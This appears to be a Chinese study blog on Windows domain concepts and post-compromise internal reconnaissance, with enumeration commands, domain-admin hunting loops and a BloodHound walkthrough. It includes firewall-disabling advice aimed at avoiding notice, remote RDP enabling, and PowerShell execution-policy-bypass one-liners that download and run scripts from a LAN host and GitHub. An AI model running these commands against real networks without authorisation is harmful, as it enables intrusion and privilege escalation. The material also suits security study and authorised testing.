<li><p><strong>组</strong>：是用户帐号的集合。通过向一组用户分配权限从而不必向每个用户分配权限，管理员在日常工作中不必要去为单个用户帐号设置自己独特的访问权限，而是将用户帐号加入到相对应的安全组中。管理员通过给相对的安全组访问权限就可以了，这样所有加入到安全组的用户帐号都将有同样的权限。使用安全组而不是单个的用户帐号可以方便，简化网络的维护和管理工作。</p>
</li>
<li><p><strong>域本地组</strong>：<strong>多域用户访问单域资源（访问同一个域）</strong>。可以从任何域添加用户账户.通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它<strong>主要是用于授予位于本域资源的访问权限</strong>。</p>
</li>
<li><p><strong>全局组</strong>：<strong>单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组</strong>，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。</p>
</li>
<li><p><strong>通用组</strong>：通用组成员来自域林中任何域中的用户账户.全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。</p>
<p>注：这样简单记忆：</p>
<ul>
<li>域本地组：来自全林用于本域</li>
<li>全局组：来自本域作用于全林</li>
<li>通用组：来自全林用于全林</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>A-G-DL-P策略</strong>：A-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。按照AGDLP的原则对用户进行组织和管理起来更容易。</p>
<ul>
<li>A（account）表示用户账户</li>
<li>G（Global group）表示全局组</li>
<li>U（universal group）表示通用组</li>
<li>DL（Domain local group）表示域本地组。</li>
<li>P（permission 许可）表示资源权限。</li>
</ul>
</li>
<li><p><strong>本地域组的权限</strong></p>
<ul>
<li>Administrators（管理员组）</li>
<li>Remote Desktop Users(远程登录组)</li>
<li>Print Operators（打印机操作员组）</li>
<li>Account Operators（帐号操作员组）</li>
<li>Server Operaters（服务器操作员组）</li>
<li>Backup Operators（备份操作员组）</li>
</ul>
</li>
<li><p><strong>全局组.通用组的权限</strong></p>
<ul>
<li>Domain Admins（域管理员组）</li>
<li>Enterprise Admins（企业系统管理员组）</li>
<li>Schema Admins（架构管理员组）</li>
<li>Domain Users（域用户组）</li>
</ul>
</li>
</ul>
<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p><strong>三个点</strong></p>
<p>机器角色判断</p>
<p>机器所处环境网络拓扑</p>
<p>当前机器所处区域</p>
<h2 id="一：工作组信息收集"><a href="#一：工作组信息收集" class="headerlink" title="一：工作组信息收集"></a>一：工作组信息收集</h2><p><strong>本机信息收集有通常有以下几种信息需要收集：</strong></p>
<h3 id="1-查询网络配置，版本信息"><a href="#1-查询网络配置，版本信息" class="headerlink" title="1. 查询网络配置，版本信息"></a>1. 查询网络配置，版本信息</h3><ul>
<li><p><strong>ipconfig &#x2F;all</strong></p>
<p><strong>可以判断是否处于内网.内网IP段.网关.DNS服务器地址.</strong></p>
<p><strong>判断有没有域</strong></p>
</li>
<li><p><strong>systeminfo</strong></p>
<p><strong>判断版本</strong></p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220309204645282.png" alt="image-20220309204645282"></p>
</li>
<li><p><strong>wmic service list brief</strong></p>
</li>
</ul>
<p>​    <strong>查询本机服务信息</strong></p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220309204949328.png" alt="image-20220309204949146"></p>
<h3 id="2-查询用户列表"><a href="#2-查询用户列表" class="headerlink" title="2. 查询用户列表"></a>2. 查询用户列表</h3><ul>
<li><strong>net user</strong>  查看本机用户列表<ul>
<li>可以看大型企业的用户名命名规则</li>
</ul>
</li>
<li><strong>net localgroup administrators</strong> 查看本机管理员<ul>
<li>通常含有域用户，用户批量管理主机的</li>
</ul>
</li>
<li><strong>query user || qwinsta</strong> 查看当前在线用户</li>
</ul>
<h3 id="3-查看进程列表"><a href="#3-查看进程列表" class="headerlink" title="3. 查看进程列表"></a>3. 查看进程列表</h3><ul>
<li><p><strong>tasklist &#x2F;v</strong></p>
<ul>
<li>可看装了什么软件，域内可能装同样的软件</li>
<li>可看进程是用什么权限运行的。若进程是以域管理员权限运行的，可通过令牌的窃取注入进程里，获取域管理员权限。</li>
</ul>
</li>
<li><p><strong>wmic process list brief</strong></p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220309205223810.png" alt="image-20220309205223810"></p>
</li>
</ul>
<h3 id="4-查看操作系统及安装软件版本信息"><a href="#4-查看操作系统及安装软件版本信息" class="headerlink" title="4. 查看操作系统及安装软件版本信息"></a>4. 查看操作系统及安装软件版本信息</h3><ul>
<li><strong>systeminfo | findstr &#x2F;B &#x2F;C:”OS 名称” &#x2F;C:”OS 版本”</strong> （英文版的话需要写成Name与Version）</li>
<li><strong>wmic product get name,version</strong><ul>
<li>查看软件安装及版本.路径等。可看杀软的版本，然后可找漏洞。</li>
</ul>
</li>
<li><strong>powershell “Get-WmiObject -class Win32_Product |Select-Object -Property name,version”</strong><ul>
<li>查看软件安装及版本.路径等。可看杀软的版本，然后可找漏洞。</li>
</ul>
</li>
</ul>
<h3 id="5-查询端口列表"><a href="#5-查询端口列表" class="headerlink" title="5. 查询端口列表"></a>5. 查询端口列表</h3><ul>
<li><strong>netstat -ano</strong><ul>
<li>可以通过信息判断服务器，如开放53端口（DNS服务器）.8530（WSUS更新）.或代理服务器。</li>
</ul>
</li>
</ul>
<h3 id="6-查看补丁列表"><a href="#6-查看补丁列表" class="headerlink" title="6. 查看补丁列表"></a>6. 查看补丁列表</h3><ul>
<li><strong>systeminfo</strong><ul>
<li>查看各种系统信息.打补丁信息，还可以判断有没有域</li>
</ul>
</li>
<li><strong>wmic qfe get Caption,Description,HotFixID,InstalledOn</strong><ul>
<li>可看打补丁的详细信息</li>
</ul>
</li>
</ul>
<h3 id="7-查询本机共享"><a href="#7-查询本机共享" class="headerlink" title="7. 查询本机共享"></a>7. 查询本机共享</h3><ul>
<li><strong>net share</strong><ul>
<li>域内的共享很多时候是相同的。</li>
</ul>
</li>
<li><strong>wmic share get name,path,status</strong></li>
</ul>
<h3 id="8-关于防火墙配置"><a href="#8-关于防火墙配置" class="headerlink" title="8. 关于防火墙配置"></a>8. 关于防火墙配置</h3><ul>
<li><strong>netsh firewall show config</strong> 查看防火墙配置详细信息</li>
<li><strong>netsh firewall set opmode mode &#x3D; enable</strong> 启动防火墙</li>
<li><strong>netsh advfirewall set allprofiles state off</strong> 关闭防火墙<ul>
<li>直接关闭防火墙动静有点大，可以添加规则，达到目的后再删除规则。</li>
</ul>
</li>
</ul>
<h3 id="9-查询并开启远程连接服务。"><a href="#9-查询并开启远程连接服务。" class="headerlink" title="9. 查询并开启远程连接服务。"></a>9. 查询并开启远程连接服务。</h3><ul>
<li><strong>Reg query “hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp” &#x2F;v portnumber</strong> 查看远程连接端口</li>
<li><strong>Windows Server 2008和Windows Server 2012开启3389方法</strong><ul>
<li>wmic &#x2F;namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;””) call setallowtsconnections 1</li>
<li>wmic &#x2F;namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;’RDP-Tcp’) call setuserauthenticationrequired 1</li>
<li>reg add “HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER” &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</li>
</ul>
</li>
</ul>
<h3 id="10-查询当前权限"><a href="#10-查询当前权限" class="headerlink" title="10. 查询当前权限"></a>10. 查询当前权限</h3><ul>
<li><strong>whoami</strong><ul>
<li>本地普通用户不能查询域内信息</li>
<li>本地管理员可以查询域内信息</li>
<li>域内用户可以查询域内信息</li>
</ul>
</li>
<li><strong>whoami &#x2F;all</strong><ul>
<li>获取域SID。SID：域内作为身份认证的唯一标识。后面域渗透中令牌窃取即窃取SID</li>
</ul>
</li>
<li><strong>net user XXX &#x2F;domain</strong> 查询指定账户的详细信息</li>
</ul>
<h3 id="11-查询路由表"><a href="#11-查询路由表" class="headerlink" title="11.查询路由表"></a>11.查询路由表</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">route print</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220309222012817.png" alt="image-20220309222012817"></p>
<h3 id="12-其它查询"><a href="#12-其它查询" class="headerlink" title="12.其它查询"></a>12.其它查询</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查询计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line">查询主机开机时间</span><br><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>





<h3 id="13-一些工具使用"><a href="#13-一些工具使用" class="headerlink" title="13.一些工具使用"></a>13.一些工具使用</h3><p>empire</p>
<p><a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p>
<p>Empire中的user_hunter模块用于查找域管理员登陆的机器，使用 powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter 模块，可查看哪个用户登陆哪台主机。</p>
<h2 id="二：域内信息收集"><a href="#二：域内信息收集" class="headerlink" title="二：域内信息收集"></a>二：域内信息收集</h2><h3 id="1-判断是否有域"><a href="#1-判断是否有域" class="headerlink" title="1. 判断是否有域"></a>1. 判断是否有域</h3><ul>
<li><strong>ipconfig &#x2F;all</strong></li>
<li><strong>systeminfo</strong></li>
<li><strong>net config workstation</strong></li>
<li><strong>net time &#x2F;domain</strong><ul>
<li>存在域，当前用户不是域用户</li>
<li>存在域，当前用户是域用户</li>
<li>提示”找不到域xx的域控制器”：不存在域</li>
</ul>
</li>
</ul>
<h3 id="2-域内存活主机的探测"><a href="#2-域内存活主机的探测" class="headerlink" title="2. 域内存活主机的探测"></a>2. 域内存活主机的探测</h3><p>白天探测，深夜探测，找出规律。</p>
<ul>
<li><p><strong>利用netbios快速探测内网</strong></p>
<ul>
<li>工具：<strong>Nbtscan</strong></li>
<li>使用方法：nbtscan.exe IP</li>
</ul>
</li>
<li><p><strong>利用ICMP协议快速探测内网</strong></p>
<ul>
<li>ping命令。<ul>
<li><strong>for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL&#x3D;”</strong> 其中“192.168.1”为网段。</li>
</ul>
</li>
<li>VBS脚本</li>
</ul>
</li>
<li><p><strong>利用arp扫描完整探测内网</strong></p>
<ul>
<li><p>工具：<strong>arp-scan</strong>，命令：arp.exe -t IP</p>
</li>
<li><p>Empire中的arpscan模块</p>
</li>
<li><p>Invoke-ARPScan.ps1</p>
</li>
<li><p>命令：</p>
<p>A.远程下载运行</p>
<p>powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘ <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.1.1/Invoke-ARPScan.ps1">http://192.168.1.1/Invoke-ARPScan.ps1</a>‘);Invoke-ARPScan -CIDR 192.168.1.0&#x2F;20” &gt;&gt; c:\windows\temp\log.txt</p>
<p>B.本地运行</p>
<p>powershell.exe -exec bypass -Command “&amp; {Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0&#x2F;20}” &gt;&gt; C:\windows\temp\log.txt</p>
<p>C. 无条件运行</p>
<p>powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1</a>‘);Invoke-Portscan -Hosts 192.168.1.0&#x2F;24 -T 4 -ports ‘445,1433,8080,3389,80’ -oA c:\windows\temp\res.txt”</p>
</li>
</ul>
</li>
<li><p><strong>利用常规tcp&#x2F;udp端口扫描探测内网</strong></p>
<ul>
<li>工具：<strong>scanline</strong></li>
<li>命令：sl -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt -p 192.168.1.1-254 &#x2F;b</li>
</ul>
</li>
<li><p><strong>域内端口扫描</strong></p>
<p>注意扫描是否会触发IDS，windows推荐使用powershell.wmic的脚本进行扫描。降低扫描的频率。</p>
<ul>
<li>端口的banner服务（欢迎语句）：在banner信息中可以得到软件开发商，软件名称.版本.服务类型等信息，通过这些信息可以使用某些工具直接去使用相对应的exp去攻击。</li>
<li>端口上运行的服务</li>
<li>常见应用的默认端口</li>
<li>常用nmap.masscan（动静比较大，已授权情况下）</li>
<li>telnet命令</li>
<li>s扫描器（速度快）<ul>
<li>命令举例：S.exe TCP 192.168.1.1 192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 &#x2F;Banner &#x2F;save</li>
</ul>
</li>
<li>metasploit可调用nmap及自身所带的脚本<ul>
<li>如search portscan，然后Use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</li>
</ul>
</li>
<li>Invoke-portscan.ps1（在powersploit下的脚本）</li>
<li><strong>常见端口机器攻击方向</strong></li>
</ul>
</li>
</ul>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111655339.png" alt="image-20220311164539593"></p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111656122.png" alt="image-20220311164604888"></p>
<h3 id="3-域内基础信息收集"><a href="#3-域内基础信息收集" class="headerlink" title="3. 域内基础信息收集"></a>3. 域内基础信息收集</h3><p>某些命令需要域用户或主机system权限才能运行。</p>
<ul>
<li><strong>net view &#x2F;domain</strong>  查询域</li>
<li><strong>net view &#x2F;domain:XXX</strong> 查询域内电脑，有时可以根据电脑名字判断目标主机为什么类型的主机。</li>
<li><strong>net group &#x2F;domain</strong> 查询域里的用户组</li>
<li><strong>net group “domain computers” &#x2F;domain</strong> 查询域成员的计算机列表</li>
<li><strong>net accounts &#x2F;domain</strong> 查询域里密码的策略</li>
<li><strong>nltest &#x2F;domain_trusts</strong> 查询域信任信息</li>
</ul>
<h3 id="4-查询域控"><a href="#4-查询域控" class="headerlink" title="4. 查询域控"></a>4. 查询域控</h3><ul>
<li><strong>nltest &#x2F;DCLIST:XXX</strong> xxx为域的名称</li>
<li><strong>Nslookup -type&#x3D;SRV *ldap.*tcp</strong></li>
<li><strong>net time &#x2F;domain</strong></li>
<li><strong>net group “Domain Controllers” &#x2F;domain</strong> 查询所有域控</li>
<li><strong>netdom query pdc</strong></li>
</ul>
<h3 id="5-查询域内用户与管理员"><a href="#5-查询域内用户与管理员" class="headerlink" title="5. 查询域内用户与管理员"></a>5. 查询域内用户与管理员</h3><ul>
<li><strong>net user &#x2F;domain</strong> 查询域内所有用户</li>
<li><strong>wmic useraccount get &#x2F;all</strong> 获取域内用户的详细信息</li>
<li><strong>dsquery user</strong></li>
<li><strong>net localgroup administrators &#x2F;domain</strong>  查询域内置的本地管理员组的用户</li>
<li><strong>net group “domain admins” &#x2F;domain</strong> 查询域管理员用户组</li>
<li><strong>net group “Enterprise Admins” &#x2F;domain</strong> 查询域管理员用户组</li>
</ul>
<h2 id="三：定位域管理员"><a href="#三：定位域管理员" class="headerlink" title="三：定位域管理员"></a>三：定位域管理员</h2><p>定位域内管理员的方法：一是通过日志，二是会话。日志指的的本地机器的管理员日志，可以使用脚本或wevtutil导出查看。<strong>会话是域内每个机器的登陆会话，可以匿名查询，无需权限，可以使用netsess.exe或powerview等工具查询。</strong>一个主机a加入到域XX中，那么域XX的管理员组会默认加入到主机a的本地管理员组中。</p>
<h3 id="1-定位域管理员的工具"><a href="#1-定位域管理员的工具" class="headerlink" title="1. 定位域管理员的工具"></a>1. 定位域管理员的工具</h3><ul>
<li><strong>psloggedon.exe</strong> 查找管理员登录信息<ul>
<li>psloggedon [-] [-l] [-x] [\computername|username] -l 表示本地登录的</li>
</ul>
</li>
<li><strong>PVEFindADUser.exe</strong> （需要管理员权限）<ul>
<li>-current</li>
</ul>
</li>
<li><strong>netsess.exe</strong> 查找主机会话<ul>
<li>-h</li>
</ul>
</li>
<li><strong>PowerView脚本-Invoke-UserHunter</strong><ul>
<li>powershell.exe -exec bypass -Command “&amp; {Import-Module C:\PowerView.ps1;Invoke-UserHunter}” 隐藏使用，调用C:\PowerView.ps1脚本</li>
</ul>
</li>
</ul>
<h2 id="四：查找域管理进程"><a href="#四：查找域管理进程" class="headerlink" title="四：查找域管理进程"></a>四：查找域管理进程</h2><h3 id="1-本机检查"><a href="#1-本机检查" class="headerlink" title="1. 本机检查"></a>1. 本机检查</h3><ul>
<li>获取域管理员列表。命令：<strong>net group “Domain Admins” &#x2F;domain</strong></li>
<li>查看本机所有进程及进程用户。命令：<strong>tasklist &#x2F;v</strong></li>
<li>寻找是否有进程所有者为域管理员的进程。</li>
</ul>
<h3 id="2-查询域控制器的域用户会话-脚本"><a href="#2-查询域控制器的域用户会话-脚本" class="headerlink" title="2. 查询域控制器的域用户会话(脚本)"></a>2. 查询域控制器的域用户会话(脚本)</h3><ul>
<li>收集所有域控制器的列表。 <strong>net group “Domain Controllers” &#x2F;domain</strong></li>
<li>收集域管理员列表。 <strong>net group “Domain Admins” &#x2F;domain</strong></li>
<li>使用Netsess.exe查询每个域控制器，收集所有活动域会话的列表。 <strong>Netsess.exe –h</strong></li>
<li>将域管理员列表与活动会话列表交叉引用，以确定哪些IP地址具有活动域令牌。</li>
</ul>
<h3 id="3-扫描远程系统上运行的任务"><a href="#3-扫描远程系统上运行的任务" class="headerlink" title="3. 扫描远程系统上运行的任务"></a>3. 扫描远程系统上运行的任务</h3><p>这个方法运行的前提：域管理员账号开启了共享</p>
<ul>
<li>收集域管理员的列表 <strong>net group “Domain Admins” &#x2F;domain</strong></li>
<li>运行脚本。将目标域系统添加到ips.txt文件中，将收集到的域管理员列表添加到names.txt文件中。</li>
</ul>
<p><strong>FOR &#x2F;F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist &#x2F;V &#x2F;S %i &#x2F;U user &#x2F;P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR &#x2F;F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</strong></p>
<h3 id="4-扫描远程系统上NetBIOS信息"><a href="#4-扫描远程系统上NetBIOS信息" class="headerlink" title="4. 扫描远程系统上NetBIOS信息"></a>4. 扫描远程系统上NetBIOS信息</h3><ul>
<li>收集域管理员列表。</li>
<li>运行脚本。将目标域系统列表添加到ips.txt文件中，将收集到的域管理员列表添加到admins.txt文件中。并置于同一目录下。</li>
</ul>
<p><strong>for &#x2F;F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR &#x2F;F %n in (admins.txt) DO @type nbsessions.txt | findstr &#x2F;I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</strong></p>
<ul>
<li>也可以使用nbtscan工具。先收集管理员列表。然后将目标域系统列表添加到ips.txt文件中，将收集到的域管理员列表添加到admins.txt文件中。并置于同一目录下。</li>
</ul>
<p><strong>for &#x2F;F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR &#x2F;F %n in (admins.txt) DO @type nbsessions.txt | findstr &#x2F;I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</strong></p>
<h2 id="五：Powershell收集域信息"><a href="#五：Powershell收集域信息" class="headerlink" title="五：Powershell收集域信息"></a>五：Powershell收集域信息</h2><p>2.0内置于win server 2008与win 7中</p>
<p>3.0内置于win server 2012与win 8中</p>
<p>4.0内置于win server 2012 R2与win 8.1中</p>
<p>5.0内置于win server 2016 与win 10中</p>
<h3 id="1-Powershell四种权限"><a href="#1-Powershell四种权限" class="headerlink" title="1. Powershell四种权限"></a>1. Powershell四种权限</h3><ul>
<li><strong>Restricted</strong> 默认设置，不允许执行任何脚本。</li>
<li><strong>Allsigned</strong> 只能运行经过证书验证的脚本。</li>
<li><strong>Unrestricted</strong> 权限最高，可以执行任意脚本。</li>
<li><strong>RemoteSigned</strong> 对本地脚本不进行限制，对来自网络的脚本必须验证其签名。</li>
</ul>
<p>操作：</p>
<ul>
<li>输入Get-ExecutionPolicy 可查看当前执行权限</li>
<li><strong>Get-ExecutionPolicy + 权限</strong> 更改执行权限。</li>
</ul>
<h3 id="2-Powershell收集域信息"><a href="#2-Powershell收集域信息" class="headerlink" title="2. Powershell收集域信息"></a>2. Powershell收集域信息</h3><p>Powershell中常用命令：</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111656686.png" alt="image-20220311165653490"></p>
<h2 id="六：域渗透分析工具BloodHound的使用"><a href="#六：域渗透分析工具BloodHound的使用" class="headerlink" title="六：域渗透分析工具BloodHound的使用"></a>六：域渗透分析工具BloodHound的使用</h2><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h2><p>BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入域环境中的权限关系。</p>
<p>BloodHound 通过在域内导出相关信息，在将数据收集后，将其导入Neo4j 数据库中，进行展示分析。因此在安装 BloodHound 时，需要安装 Neo4j 数据库。</p>
<h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h2><p>因为 Neo4j 数据库需要 Java 支持，因此安装 BloodHound 需要先安装 Java，这里以 Windows 系统下的安装为例。</p>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>JDK 需要下载最新版本，不然 Neo4j 运行可能会报错，JDK 下载地址：<a href="http://link.zhihu.com/?target=https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a>，下载之后，直接安装即可。</p>
<h3 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h3><p>Neo4j 直接下载最新版本，下载地址：<a href="http://link.zhihu.com/?target=https://neo4j.com/download-center/%23community">https://neo4j.com/download-center/#community</a></p>
<p>下载最新版本之后解压下载文件，打开 bin 目录，执行命令neo4j.bat console，之后打开浏览器访问 <a target="_blank" rel="noopener" href="http://localhost:7474/">http://localhost:7474</a> 登陆后台，输入以下信息连接到数据库说明安装就完成了。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：neo4j://localhost:7687</span><br><span class="line">用户名(默认)：neo4j</span><br><span class="line">密码(默认)：neo4j</span><br></pre></td></tr></table></figure>

<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>BloodHound 项目地址：<a href="http://link.zhihu.com/?target=https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a>，下载后解压打开 BloodHound.exe，输入 Neo4j 数据库的账号密码即可完成安装。</p>
<h2 id="3-使用"><a href="#3-使用" class="headerlink" title="3.使用"></a>3.使用</h2><p>安装完成 BloodHound 后，需要进行数据的采集与导入，数据的采集可以使用 ps1 脚本或者使用 exe 程序收集，工具下载地址：<a href="http://link.zhihu.com/?target=https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p>
<p>这里使用 SharpHound.exe 进行数据的采集，将 SharpHound.exe 拷贝到目标上，执行 SharpHound.exe -c all 进行数据采集。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\daniel10&gt;SharpHound.exe -c all</span><br><span class="line">---------------------------------------------</span><br><span class="line">Initializing SharpHound at 22:36 on 2021/2/25</span><br><span class="line">---------------------------------------------</span><br><span class="line">Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container</span><br><span class="line">[+] Creating Schema map for domain TEAMSSIX.COM using path CN=Schema,CN=Configuration,DC=teamssix,DC=com</span><br><span class="line">[+] Cache File Found! Loaded 1332 Objects in cache</span><br><span class="line">[+] Pre-populating Domain Controller SIDS</span><br><span class="line">Status: 0 objects finished (+0) -- Using 24 MB RAM</span><br><span class="line">Status: 673 objects finished (+673 134.6)/s -- Using 43 MB RAM</span><br><span class="line">Enumeration finished in 00:00:05.3136324</span><br><span class="line">Compressing data to .\20210225223622_BloodHound.zip</span><br><span class="line">You can upload this file directly to the UI</span><br><span class="line">SharpHound Enumeration Completed at 22:36 on 2021/2/25! Happy Graphing!</span><br></pre></td></tr></table></figure>

<p>如果使用 ps1 脚本收集，命令为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -command &quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</span><br></pre></td></tr></table></figure>

<p>采集到的数据会以 zip 压缩包的格式保存，将其拷贝到 BloodHound 所在主机上，在 BloodHound 右侧图标里点击 Upload Data，之后上传刚才生成的压缩包就可以导入数据了。</p>
<blockquote>
<p> 或者直接将 zip 压缩包拖拽到 BloodHound 里也可以导入数据。</p>
</blockquote>
<p>在 BloodHound 右上角有三个板块：</p>
<p>1.Database Info（数据库信息），可以查看当前数据库中的域用户.域计算机等统计信息。</p>
<p>2.Node Indo（节点信息），单击某个节点时，在这里可以看到对应节点的相关信息。</p>
<p>3.Analysis（分析查询），在 BloodHound 中预设了一些查询条件，具体如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.查询所有域管理员</span><br><span class="line">2.寻找到域管理员的最短路径</span><br><span class="line">3.查找具有DCSync权限的主体</span><br><span class="line">4.具有外部域组成员资格的用户</span><br><span class="line">5.具有外部域名组成员资格的组</span><br><span class="line">6.映射域信任</span><br><span class="line">7.到无约束委托系统的最短路径</span><br><span class="line">8.到达Kerberoastable用户的最短路径</span><br><span class="line">9.从Kerberoastable用户到域管理员的最短路径</span><br><span class="line">10.拥有的主体的最短路径</span><br><span class="line">11.从拥有的主体到域管理员的最短路径</span><br><span class="line">12.到高价值目标的最短路径</span><br><span class="line">13.查找域用户是本地管理员的计算机</span><br><span class="line">14.查找域用户可以读取密码的计算机</span><br><span class="line">15.从域用户到高价值目标的最短路径</span><br><span class="line">16.找到从域用户到高价值目标的所有路径</span><br><span class="line">17.找到域用户可以RDP的工作站</span><br><span class="line">18.找到域用户可以RDP的服务器</span><br><span class="line">19.查找域用户组的危险权限</span><br><span class="line">20.找到高价值群体中能够支持kerberoable的成员</span><br><span class="line">21.列出所有kerberoable用户</span><br><span class="line">22.查找具有大多数特权的Kerberoastable用户</span><br><span class="line">23.查找到非域控制器的域管理登录</span><br><span class="line">24.查找不支持操作系统的计算机</span><br><span class="line">25.查找AS-REP Roastable用户(DontReqPreAuth)</span><br></pre></td></tr></table></figure>

<p>比如这里查询到域管理员的最短路径</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-97e8ed747736ee0adb9c1ba4549df0f4_720w.jpg" alt="img"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-97e8ed747736ee0adb9c1ba4549df0f4_720w.jpg" alt="img"></p>
<blockquote>
<p> 路径由粗到细表示xx对xx有权限或关系</p>
</blockquote>
<p>总的来说感觉 BloodHound 还是挺有意思的，可以很直观的看到域内主机间的关系。不过毕竟是辅助工具，还是需要不断提升自己的实力.经验才能更好的去分析这样的一个结果才是。</p>
